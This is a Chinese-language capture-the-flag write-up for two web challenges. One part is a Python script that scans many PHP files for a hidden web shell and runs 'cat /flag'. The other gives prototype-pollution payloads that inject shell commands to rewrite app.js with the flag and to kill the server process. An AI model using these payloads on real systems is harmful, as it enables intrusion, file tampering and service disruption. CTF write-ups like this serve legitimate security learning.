## Big Hacker

强网国赛的题目。。。  
本地起环境爆参数，还应该测一下POST，但是GET就有shell  
多线程线程池不太好维护，单线程也不会很慢...  

```python
import os
import re
import time

import requests

uuid = "36b6ae3a-2c5b-4ad1-a42a-cb656ac54780"
start = "A00UTldNShN.php"

# http://detroit.sustech.edu.cn:28084/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag

if __name__ == '__main__':
    while True:
        try:
            global start
            hit = False
            for i in os.listdir("e:\\desk\\src"):
                if not hit and i != start:
                    continue
                start = i
                hit = True
                f = open(f"e:\\desk\\src\\{i}", "r", encoding="utf-8")
                print(f"[*] testing: {i}")
                code = f.read()
                gets = re.findall(r"\$_GET\['(.*?)']", code)
                for param in gets:
                    r = requests.get(f"http://192.168.254.137/src/{i}?{param}=echo {uuid}")
                    if r.status_code != 200:
                        if requests.get("http://192.168.254.137/src/A00UTldNShN.php").status_code != 200:
                            raise Exception("500")
                        else:
                            continue
                    if uuid in r.text:
                        print(f"[+] shell fond on: {i}")
                        print(f"[+] get: {param}")
                        exit(0)
        except Exception as e:
            print(e)
            time.sleep(1)
            print("[-] retrying...")

```

## Proto Note

原型链污染，网鼎国赛的题。  

本来环境问题只允许web服务的端口正向出网，思路是杀掉自己的进程再抢一个正向shell占掉端口，但是环境里nc python都没有，非常感人。  

利用上边的思路还是能当成不出网的题目做的

POST `http://172.18.36.237:28052/edit_note`  
`id=__proto__.x&raw=x&author=sed -i 's#Sorry cant find that!#'$FLAG'#' app.js`  污染，替换404为flag  

GET `http://172.18.36.237:28016/status` 刷新  

POST `http://172.18.36.237:28052/edit_note`   
`id=__proto__.x&raw=x&author=kill -9 29`  杀掉进程，守护进程会让它重启  
没有重启可以执行一次 `node app.js`  

GET `http://172.18.36.237:28016/status` 刷新  
pid可以从200往下爆破，无响应后重启就中了。每次容器初次启动都在29号。  


GET `http://172.18.36.237:28016/fuck` 随便找个404页面就可以拿到flag。  